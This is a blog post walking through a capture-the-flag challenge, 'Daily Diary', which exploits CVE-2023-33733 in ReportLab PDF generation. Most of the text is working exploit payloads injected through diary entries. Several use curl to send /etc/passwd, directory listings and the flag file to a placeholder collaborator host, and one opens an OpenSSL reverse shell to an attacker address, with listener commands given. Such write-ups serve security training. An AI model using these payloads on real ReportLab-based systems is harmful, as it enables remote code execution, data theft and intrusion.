Title: HackingHub | Daily Diary — Advanced CTF Challenge Walkthrough

URL Source: https://tukbdr.medium.com/hackinghub-daily-diary-advanced-ctf-challenge-walkthrough-55d58f370d36

Published Time: 2026-01-23T04:09:06Z

Markdown Content:
[![Image 1: Tuk Bahadur Kumhal](https://miro.medium.com/v2/da:true/resize:fill:32:32/0*WCbdtCKtQmXfcjiH)](https://tukbdr.medium.com/?source=post_page---byline--55d58f370d36-----------------------------------------)

7 min read

Jan 23, 2026

Press enter or click to view image in full size

![Image 2](https://miro.medium.com/v2/resize:fit:700/1*FkaVThtMg8O3n3bYaY1wzw.jpeg)

Daily Diary Challenge

**Challenge Description — Daily Diary ( Advanced )**

> This Challenge is about a diary platform where users can write, save, and download their entries. Our goal is to track down the underlying exploit, get code execution on the server, and extract the flag.

The given question is

What is the value of **_/flag.txt_**?

— — — — — — — — — — — — — — — — —

I had no prior knowledge of the **Daily Diary** challenge until one of my colleague approached me and said, _Brother, can you help me solve this challenge?_ He had already spent nearly **2.5 hours** working on it and was exhausted, so he asked for my help. I agreed and decided to give it a try.

In this blog, we will explore **two different methods** to exploit the **Daily Diary** challenge, which are outlined below:

**Method 1**: Exploitation Using **_curl_** Command

I began working on this challenge by testing various common web vulnerabilities such as **_XSS_** and other basic attack vectors, but initially, none of them were successful.

After that, I created a **fresh diary entry** and downloaded it to analyze the application’s request and response behavior. While inspecting the **PDF download HTTP response** in **Burp Suite**, I noticed an interesting detail i.e. the PDF was generated using [**_ReportLab_**](http://www.reportlab.com/).

Press enter or click to view image in full size

![Image 3](https://miro.medium.com/v2/resize:fit:700/1*5ogZvnLjii9DNeXuAYSyfQ.jpeg)

Press enter or click to view image in full size

![Image 4](https://miro.medium.com/v2/resize:fit:700/1*Cq7XzmO2ktEdB5oVzH7IEw.jpeg)

With this information, I started researching potential vulnerabilities related to **ReportLab PDF generation**. During this process, I discovered a known vulnerability: [**_CVE‑2023‑33733_**](https://github.com/c53elyas/CVE-2023-33733), which can be leveraged to achieve **Remote Code Execution (RCE)** under certain conditions.

Press enter or click to view image in full size

![Image 5](https://miro.medium.com/v2/resize:fit:700/1*3HPwAr8anwaxcUSlWEALAg.jpeg)

Press enter or click to view image in full size

![Image 6](https://miro.medium.com/v2/resize:fit:700/1*oXJ384CHHJicel8CEaTGxg.jpeg)

**Basic Exploitation Code** given in the**POC** is

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">  
 exploit  
</font></para>
I initially tested the above payload, but the main issue was that the **_exploited file_** was created on the **victim machine**, which meant I had no direct way to verify whether the exploitation was successful.

To overcome this limitation, I crafted a new payload using **_curl_**, along with **ping** and **wget**, in order to trigger an **_out‑of‑band (OOB)_** interaction. During testing, both **_ping_** and **_wget_** failed to generate any observable response. However, the **_curl_**command worked successfully, and I received a **_blind hit in Burp Suite Collaborator_**, confirming code execution on the server.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl <burp_collaborator>') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">  
 exploit  
</font></para>

Press enter or click to view image in full size

![Image 7](https://miro.medium.com/v2/resize:fit:700/1*6WNdmEo8S0boQmJOW0kcvw.jpeg)

Press enter or click to view image in full size

![Image 8](https://miro.medium.com/v2/resize:fit:700/1*_4VZpzFVYr0Qzt4uz1J1bQ.jpeg)

Press enter or click to view image in full size

![Image 9](https://miro.medium.com/v2/resize:fit:700/1*Am8WUUUCZR5AAXXHouAlBQ.jpeg)

After confirming code execution, I crafted another payload to **read** the **_/etc/passwd_** file from the target machine, allowing me to verify file‑read access and better understand the system context.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl -X POST --data-binary @/etc/passwd http://<burp_collaborator>/') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">  
 exploit  
</font></para>

Press enter or click to view image in full size

![Image 10](https://miro.medium.com/v2/resize:fit:700/1*aNvK8HSJ0Mgm52JwFVG2Vg.jpeg)

Press enter or click to view image in full size

![Image 11](https://miro.medium.com/v2/resize:fit:700/1*2-d_mPfy3bBAt-f6hwje_Q.jpeg)

Press enter or click to view image in full size

![Image 12](https://miro.medium.com/v2/resize:fit:700/1*BDfDZaF_8MS-tyfvtYmt_w.jpeg)

I then crafted another payload to **determine the current working directory** of the application.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl -G --data-urlencode d=$(pwd) http://<burp_collaborator>/') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">  
 exploit  
</font></para>

Press enter or click to view image in full size

![Image 13](https://miro.medium.com/v2/resize:fit:700/1*JQVOJJH_5wJE-lYgB16sCg.jpeg)

Press enter or click to view image in full size

![Image 14](https://miro.medium.com/v2/resize:fit:700/1*JClWcqO6Bx4wsb2vQNw81w.jpeg)

Press enter or click to view image in full size

![Image 15](https://miro.medium.com/v2/resize:fit:700/1*Tq2-f_wYseqihBxys5z8zg.jpeg)

I then crafted another payload to**list the files present in the current working directory**, which helped identify interesting files and directories related to the application.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl -G --data-urlencode d=$(ls) http://<burp_collaborator>/') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">  
 exploit  
</font></para>

Press enter or click to view image in full size

![Image 16](https://miro.medium.com/v2/resize:fit:700/1*qY7Gjo2G3ZHtMr2AumOp2w.jpeg)

Press enter or click to view image in full size

![Image 17](https://miro.medium.com/v2/resize:fit:700/1*fQNkhCRGNgV_sBSYCDy9Qg.jpeg)

Press enter or click to view image in full size

![Image 18](https://miro.medium.com/v2/resize:fit:700/1*zKXEpNU-9rBI7npDSFpchg.jpeg)

Finally, I crafted another payload to **read the contents** of the **_flag.txt_** file, completing the objective of the challenge.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl -G --data-urlencode d=$(cat /app/flag.txt) http://<burp_collaborator>/') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">  
 exploit  
</font></para>

Press enter or click to view image in full size

![Image 19](https://miro.medium.com/v2/resize:fit:700/1*mf64gbaB-ZbLo3Be9ZQ3Yw.jpeg)

Press enter or click to view image in full size

![Image 20](https://miro.medium.com/v2/resize:fit:700/1*4Bk-DNxWLsn0dxsr3GsvDQ.jpeg)

Press enter or click to view image in full size

![Image 21](https://miro.medium.com/v2/resize:fit:700/1*U2hOpoCtTmDXFp-mXXUq0Q.jpeg)

**Method 2**: Gaining RCE in Daily Diary Challenge via **CVE-2023–33733** (**_ReportLab_**)

## Get Tuk Bahadur Kumhal’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Although I was able to retrieve **_flag.txt_** using the **curl‑based approach** described earlier, I wanted to achieve full **Remote Code Execution (RCE)** on the target system.

Since many of the common reverse shell techniques were not working in this scenario, I decided to use **_OpenSSL_** to establish a **reverse shell**.

As I didn’t have access to a **VPS**, I used [**_LocaltoNet_**](https://localtonet.com/) to create a **TCP tunnel**, allowing me to receive the reverse shell connection on my **local attacker machine**.

**Attacker Side:**

First, on the attacker machine, I generated a self‑signed SSL certificate and private key using OpenSSL:

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
Next, I started an OpenSSL server to listen for incoming connections on the desired port:

openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>

Press enter or click to view image in full size

![Image 22](https://miro.medium.com/v2/resize:fit:700/1*fDPpC2KQwsOLBDvGQD_5uA.jpeg)

**Client Side — Daily Diary Application:**

On the client side, I crafted a malicious payload that injected **OpenSSL‑based reverse shell code** into the application. This payload allowed me to achieve **Remote Code Execution (RCE)** and ultimately read the contents of the **_flag.txt_** file from the server.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <Attacker_IP>:<Listening_Port> > /tmp/s; rm /tmp/s') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">  
 exploit  
</font></para>

Press enter or click to view image in full size

![Image 23](https://miro.medium.com/v2/resize:fit:700/1*8fY1Glh3rsDGbqPe-fHQnw.jpeg)

Press enter or click to view image in full size

![Image 24](https://miro.medium.com/v2/resize:fit:700/1*eKDv7Osu3CDZCPHynFmhDw.jpeg)

Press enter or click to view image in full size

![Image 25](https://miro.medium.com/v2/resize:fit:700/1*CWl8dYI3ZtMxzDk7a5lWTw.jpeg)

**Key Takeaways:**

*   Small details break big systems.
*   Blind output still talks and listen Out-of-Band (OOB).
*   If common reverse shells fail, adapt and try alternative methods.
*   Patience & Persistence wins challenges.

**_Thank you For Reading this !!_**

**Reference:**

*   [https://github.com/c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
*   [https://app.interactsh.com/](https://app.interactsh.com/) ← If you are using BurpSuite Community
*   [https://www.revshells.com/](https://www.revshells.com/)
